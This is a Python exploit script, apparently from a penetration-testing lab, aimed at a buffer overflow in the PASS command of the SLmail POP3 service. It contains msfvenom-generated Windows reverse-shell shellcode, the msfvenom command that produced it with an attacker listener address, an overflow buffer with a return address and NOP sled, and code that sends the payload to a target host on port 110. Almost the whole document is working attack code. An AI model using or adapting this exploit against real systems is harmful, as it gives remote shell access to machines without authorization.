#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Use the following code with msvenom to create the shellcode below:
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.187 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
# The EXITFUNC=thread allows the target SLmail service to continue running after exploitation instead of crashing.

shellcode = ("\xd9\xce\xd9\x74\x24\xf4\x58\xbb\xb0\xe2\x34\x97\x2b\xc9\xb1"
"\x52\x31\x58\x17\x83\xe8\xfc\x03\xe8\xf1\xd6\x62\xf4\x1e\x94"
"\x8d\x04\xdf\xf9\x04\xe1\xee\x39\x72\x62\x40\x8a\xf0\x26\x6d"
"\x61\x54\xd2\xe6\x07\x71\xd5\x4f\xad\xa7\xd8\x50\x9e\x94\x7b"
"\xd3\xdd\xc8\x5b\xea\x2d\x1d\x9a\x2b\x53\xec\xce\xe4\x1f\x43"
"\xfe\x81\x6a\x58\x75\xd9\x7b\xd8\x6a\xaa\x7a\xc9\x3d\xa0\x24"
"\xc9\xbc\x65\x5d\x40\xa6\x6a\x58\x1a\x5d\x58\x16\x9d\xb7\x90"
"\xd7\x32\xf6\x1c\x2a\x4a\x3f\x9a\xd5\x39\x49\xd8\x68\x3a\x8e"
"\xa2\xb6\xcf\x14\x04\x3c\x77\xf0\xb4\x91\xee\x73\xba\x5e\x64"
"\xdb\xdf\x61\xa9\x50\xdb\xea\x4c\xb6\x6d\xa8\x6a\x12\x35\x6a"
"\x12\x03\x93\xdd\x2b\x53\x7c\x81\x89\x18\x91\xd6\xa3\x43\xfe"
"\x1b\x8e\x7b\xfe\x33\x99\x08\xcc\x9c\x31\x86\x7c\x54\x9c\x51"
"\x82\x4f\x58\xcd\x7d\x70\x99\xc4\xb9\x24\xc9\x7e\x6b\x45\x82"
"\x7e\x94\x90\x05\x2e\x3a\x4b\xe6\x9e\xfa\x3b\x8e\xf4\xf4\x64"
"\xae\xf7\xde\x0c\x45\x02\x89\x38\x91\x0c\xf2\x55\xa7\x0c\x05"
"\x1d\x2e\xea\x6f\x71\x67\xa5\x07\xe8\x22\x3d\xb9\xf5\xf8\x38"
"\xf9\x7e\x0f\xbd\xb4\x76\x7a\xad\x21\x77\x31\x8f\xe4\x88\xef"
"\xa7\x6b\x1a\x74\x37\xe5\x07\x23\x60\xa2\xf6\x3a\xe4\x5e\xa0"
"\x94\x1a\xa3\x34\xde\x9e\x78\x85\xe1\x1f\x0c\xb1\xc5\x0f\xc8"
"\x3a\x42\x7b\x84\x6c\x1c\xd5\x62\xc7\xee\x8f\x3c\xb4\xb8\x47"
"\xb8\xf6\x7a\x11\xc5\xd2\x0c\xfd\x74\x8b\x48\x02\xb8\x5b\x5d"
"\x7b\xa4\xfb\xa2\x56\x6c\x1b\x41\x72\x99\xb4\xdc\x17\x20\xd9"
"\xde\xc2\x67\xe4\x5c\xe6\x17\x13\x7c\x83\x12\x5f\x3a\x78\x6f"
"\xf0\xaf\x7e\xdc\xf1\xe5")

buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode + "C"*(3500-2606-4-351-16)
# buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90"*8 + shellcode

try:
  print "\nSending evil buffer..."
  s.connect(('10.11.10.124',110))
  data = s.recv(1024)
  s.send('USER username' +'\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!."
except:
  print "Could not connect to POP3!"
